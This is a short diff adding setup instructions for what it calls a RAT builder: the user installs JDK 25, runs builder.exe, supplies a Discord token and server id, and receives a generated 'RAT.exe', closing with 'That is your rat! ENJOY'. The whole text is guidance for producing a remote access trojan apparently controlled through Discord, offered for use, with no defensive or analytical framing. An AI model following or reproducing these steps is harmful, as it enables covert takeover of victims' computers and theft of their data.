@@ -1,0 +1,7 @@
+You need JDK 25 So search JDK 25, the download for JDK 25 x64 installer is https://download.oracle.com/java/25/latest/jdk-25_windows-x64_bin.exe 
+Open builder.exe (scan first if you want to)
+Input discord token,Discord guild id (discord server id) Search it up if you dont know how
+Check the folder
+You will see a file called "RAT.exe"
+  That is your rat!
+  ENJOY 
